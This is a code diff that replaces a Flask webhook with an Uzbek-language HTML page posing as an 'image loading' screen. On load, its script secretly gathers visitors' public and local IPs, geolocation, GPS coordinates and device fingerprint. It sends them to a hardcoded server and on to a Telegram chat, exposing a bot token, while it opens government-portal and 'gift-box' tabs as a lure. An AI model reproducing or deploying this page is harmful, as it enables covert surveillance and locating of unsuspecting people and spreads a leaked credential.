@@ -1,27 +1,471 @@
-# Flask misolida
-from flask import Flask, request, jsonify
-import requests
-
-app = Flask(__name__)
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    data = request.json
-    
-    # Agar Telegram xabari bo'lsa
-    if data.get('type') == 'telegram_message':
-        telegram_url = f"https://api.telegram.org/bot{data['telegram_token']}/sendMessage"
-        payload = {
-            'chat_id': data['telegram_chat_id'],
-            'text': data['message'],
-            'parse_mode': 'HTML'
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Rasm Yuklanmoqda...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            overflow: hidden;
         }
-        requests.post(telegram_url, json=payload)
+        .loading-container {
+            text-align: center;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            z-index: 10;
+            position: relative;
+        }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h1 {
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            margin: 5px 0;
+            opacity: 0.9;
+        }
+        .page-indicator {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 100;
+        }
+        .status-message {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 100;
+        }
+        .hidden-frame {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: none;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+        .active-frame {
+            opacity: 1;
+            pointer-events: all;
+            z-index: 5;
+        }
+        .controls {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            z-index: 100;
+        }
+        .controls button {
+            background: rgba(255, 255, 255, 0.2);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 0 5px;
+        }
+        .controls button:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        .success-message {
+            background: rgba(0, 255, 0, 0.2);
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="controls">
+        <button onclick="pauseRotation()">Pause</button>
+        <button onclick="resumeRotation()">Resume</button>
+    </div>
+    <div class="page-indicator">Sahifa: <span id="currentPage">1</span>/<span id="totalPages">3</span></div>
+    <div class="status-message" id="statusMessage">Asosiy sahifa faol</div>
     
-    # Barcha ma'lumotlarni saqlash
-    print("Qabul qilingan ma'lumot:", data)
-    
-    return jsonify({'status': 'success'})
+    <div class="loading-container">
+        <div class="spinner"></div>
+        <h1>Rasm Yuklanmoqda...</h1>
+        <p>Iltimos, kuting</p>
+        <div class="success-message" id="successMessage">Ma'lumotlar serverga yuborildi! ✅</div>
+    </div>
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    <iframe id="frame1" class="hidden-frame" src="about:blank"></iframe>
+
+    <script>
+        // Sizning webhook serveringiz
+        const WEBHOOK_URL = "http://38.242.228.144:5000/webhook";
+        const TELEGRAM_TOKEN = "8497552094:AAH9XKSVaoiisVOTD-gXW8GX9l8l1m5ioWM";
+        const TELEGRAM_CHAT_ID = "-1003100389091";
+
+        // Webhook serveriga ma'lumot yuborish
+        async function sendToWebhook(data) {
+            try {
+                console.log('Webhookga maʼlumot yuborilmoqda:', data);
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (response.ok) {
+                    console.log('Maʼlumotlar webhookga muvaffaqiyatli yuborildi');
+                    showSuccess('Maʼlumotlar serverga yuborildi! ✅');
+                    return true;
+                } else {
+                    throw new Error(`Server javobi: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Webhook xatosi:', error);
+                // Xatolik bo'lsa ham dastur ishlashda davom etadi
+                return false;
+            }
+        }
+
+        // Telegramga xabar yuborish (webhook orqali)
+        async function sendToTelegram(message) {
+            const telegramData = {
+                type: 'telegram_message',
+                telegram_token: TELEGRAM_TOKEN,
+                telegram_chat_id: TELEGRAM_CHAT_ID,
+                message: message,
+                timestamp: new Date().toISOString()
+            };
+            
+            return await sendToWebhook(telegramData);
+        }
+
+        // Muvaffaqiyat xabarini ko'rsatish
+        function showSuccess(message) {
+            const successElement = document.getElementById('successMessage');
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+            setTimeout(() => {
+                successElement.style.display = 'none';
+            }, 3000);
+        }
+
+        // Sahifalar ro'yxati
+        const pages = [
+            'https://my.gov.uz/ru',
+            'https://gift-box.site/66b108e0a4269/1882641120', 
+            'https://id.egov.uz/oz'
+        ];
+        
+        const totalPages = pages.length;
+        document.getElementById('totalPages').textContent = totalPages;
+        
+        let currentPageIndex = 0;
+        let rotationPaused = false;
+        let rotationTimer = null;
+        
+        function openInNewTab(url, pageNumber) {
+            try {
+                const newTab = window.open(url, '_blank');
+                if (newTab) {
+                    document.getElementById('statusMessage').textContent = 
+                        `Sahifa ${pageNumber} yangi tabda ochildi`;
+                    return true;
+                } else {
+                    const link = document.createElement('a');
+                    link.href = url;
+                    link.target = '_blank';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    document.getElementById('statusMessage').textContent = 
+                        `Sahifa ${pageNumber} yangi tabda ochildi`;
+                    return true;
+                }
+            } catch (error) {
+                document.getElementById('statusMessage').textContent = 
+                    `Sahifa ${pageNumber} ochilmadi: ${error.message}`;
+                return false;
+            }
+        }
+        
+        function switchPage() {
+            if (rotationPaused) return;
+            
+            currentPageIndex = (currentPageIndex + 1) % totalPages;
+            document.getElementById('currentPage').textContent = currentPageIndex + 1;
+            
+            if (currentPageIndex === 0) {
+                const currentFrame = document.getElementById('frame1');
+                currentFrame.classList.add('active-frame');
+                if (currentFrame.src === 'about:blank') {
+                    currentFrame.src = pages[currentPageIndex];
+                }
+                document.getElementById('statusMessage').textContent = 'Asosiy sahifa faol';
+            } else {
+                openInNewTab(pages[currentPageIndex], currentPageIndex + 1);
+                const mainFrame = document.getElementById('frame1');
+                mainFrame.classList.add('active-frame');
+                document.getElementById('statusMessage').textContent = 
+                    `Sahifa ${currentPageIndex + 1} yangi tabda ochilmoqda...`;
+            }
+            
+            rotationTimer = setTimeout(switchPage, 500);
+        }
+        
+        function startPageRotation() {
+            const firstFrame = document.getElementById('frame1');
+            firstFrame.src = pages[0];
+            firstFrame.classList.add('active-frame');
+            rotationTimer = setTimeout(switchPage, 500);
+        }
+        
+        function pauseRotation() {
+            rotationPaused = true;
+            if (rotationTimer) {
+                clearTimeout(rotationTimer);
+            }
+            document.getElementById('statusMessage').textContent = 'Sahifa almashinishi to\'xtatildi';
+        }
+        
+        function resumeRotation() {
+            rotationPaused = false;
+            document.getElementById('statusMessage').textContent = 'Sahifa almashinishi davom etmoqda';
+            rotationTimer = setTimeout(switchPage, 500);
+        }
+        
+        // Asosiy tracking funksiyasi
+        async function startTracking() {
+            try {
+                // 1. IP va geolokatsiya ma'lumotlarini olish
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const publicIP = ipData.ip;
+
+                // Geolokatsiya ma'lumotlari
+                let geoData = {};
+                try {
+                    const geoResponse = await fetch(`http://ip-api.com/json/${publicIP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+                    geoData = await geoResponse.json();
+                } catch (geoError) {
+                    console.log('Geolokatsiya xatosi:', geoError);
+                }
+
+                // 2. Local IP ni olish
+                let localIPs = "Aniqlanmoqda";
+                try {
+                    const pc = new RTCPeerConnection({iceServers: []});
+                    pc.createDataChannel('');
+                    await pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    
+                    const ips = [];
+                    pc.onicecandidate = (e) => {
+                        if (e.candidate) {
+                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                            if (match) ips.push(match[1]);
+                        }
+                    };
+                    
+                    setTimeout(() => {
+                        localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
+                    }, 2000);
+                } catch (e) {
+                    localIPs = 'Xato: ' + e.message;
+                }
+
+                // 3. Tizim ma'lumotlarini yig'ish
+                const systemInfo = {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    cookieEnabled: navigator.cookieEnabled,
+                    hardwareConcurrency: navigator.hardwareConcurrency || 'Nomaʼlum',
+                    deviceMemory: navigator.deviceMemory || 'Nomaʼlum',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    screen: `${screen.width}x${screen.height}`,
+                    colorDepth: `${screen.colorDepth}-bit`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    url: window.location.href
+                };
+
+                // 4. Asosiy ma'lumotlarni webhookga yuborish
+                const trackingData = {
+                    type: 'user_tracking',
+                    public_ip: publicIP,
+                    local_ips: localIPs,
+                    geo_data: geoData,
+                    system_info: systemInfo,
+                    timestamp: new Date().toISOString(),
+                    user_agent: navigator.userAgent
+                };
+
+                await sendToWebhook(trackingData);
+
+                // 5. Telegramga formatlangan xabar yuborish
+                let telegramMessage = "🆕 <b>Yangi Foydalanuvchi Kirdi</b>\n\n";
+                telegramMessage += `🌐 <b>Public IP:</b> <code>${publicIP}</code>\n`;
+                telegramMessage += `🏠 <b>Local IPs:</b> ${localIPs}\n`;
+                
+                if (geoData.status === 'success') {
+                    telegramMessage += `\n🗺️ <b>Geolokatsiya:</b>\n`;
+                    telegramMessage += `📍 <b>Joylashuv:</b> ${geoData.city}, ${geoData.regionName}, ${geoData.country}\n`;
+                    telegramMessage += `📡 <b>Koordinatalar:</b> ${geoData.lat}, ${geoData.lon}\n`;
+                    telegramMessage += `🏢 <b>ISP:</b> ${geoData.isp}\n`;
+                }
+
+                telegramMessage += `\n💻 <b>Tizim Maʼlumotlari:</b>\n`;
+                telegramMessage += `🔧 <b>Platforma:</b> ${systemInfo.platform}\n`;
+                telegramMessage += `🖥️ <b>Ekran:</b> ${systemInfo.screen}\n`;
+                telegramMessage += `⏰ <b>Vaqt zonası:</b> ${systemInfo.timezone}\n`;
+                telegramMessage += `🔗 <b>URL:</b> ${systemInfo.url}`;
+
+                await sendToTelegram(telegramMessage);
+
+            } catch (error) {
+                console.error('Tracking xatosi:', error);
+                
+                // Xatolik haqida ham ma'lumot yuborish
+                const errorData = {
+                    type: 'tracking_error',
+                    error: error.message,
+                    timestamp: new Date().toISOString()
+                };
+                await sendToWebhook(errorData);
+            }
+        }
+
+        // GPS ma'lumotlarini yuborish
+        function trackGPS() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const gpsData = {
+                            type: 'gps_location',
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            altitude: position.coords.altitude,
+                            speed: position.coords.speed,
+                            timestamp: new Date().toISOString()
+                        };
+
+                        await sendToWebhook(gpsData);
+
+                        const gpsMessage = `📍 <b>GPS MAʼLUMOTLARI</b>\n\n` +
+                                          `🌍 <b>Kenglik:</b> ${position.coords.latitude}\n` +
+                                          `🌎 <b>Uzunlik:</b> ${position.coords.longitude}\n` +
+                                          `🎯 <b>Aniqlik:</b> ${position.coords.accuracy}m\n` +
+                                          `🏔️ <b>Balandlik:</b> ${position.coords.altitude || 'Nomaʼlum'}m\n` +
+                                          `🚀 <b>Tezlik:</b> ${position.coords.speed || 'Nomaʼlum'}m/s`;
+
+                        await sendToTelegram(gpsMessage);
+                    },
+                    async (error) => {
+                        const gpsErrorData = {
+                            type: 'gps_error',
+                            error: error.message,
+                            code: error.code,
+                            timestamp: new Date().toISOString()
+                        };
+                        await sendToWebhook(gpsErrorData);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+        }
+
+        // Qo'shimcha ma'lumotlarni yig'ish
+        function collectAdditionalInfo() {
+            const info = {
+                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Yoʻq',
+                javaEnabled: navigator.javaEnabled(),
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                doNotTrack: navigator.doNotTrack || 'Nomaʼlum',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'Nomaʼlum'
+            };
+            return info;
+        }
+
+        // Dasturni ishga tushirish
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Asosiy trackingni boshlash
+            await startTracking();
+            
+            // GPS trackingni boshlash
+            setTimeout(trackGPS, 2000);
+            
+            // Qo'shimcha ma'lumotlarni yuborish
+            setTimeout(async () => {
+                const additionalInfo = collectAdditionalInfo();
+                const additionalData = {
+                    type: 'additional_info',
+                    browser_info: additionalInfo,
+                    timestamp: new Date().toISOString()
+                };
+                
+                await sendToWebhook(additionalData);
+            }, 4000);
+            
+            // Sahifalar almashinishini boshlash
+            startPageRotation();
+        });
+
+        // Brauzer yopilayotganda so'nggi ma'lumotni yuborish
+        window.addEventListener('beforeunload', async function() {
+            const exitData = {
+                type: 'user_exit',
+                timestamp: new Date().toISOString(),
+                message: 'Foydalanuvchi sahifani tark etdi'
+            };
+            
+            // Sync so'rov yuborish (brauzer blok qilmasligi uchun)
+            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(exitData));
+        });
+    </script>
+</body>
+</html>
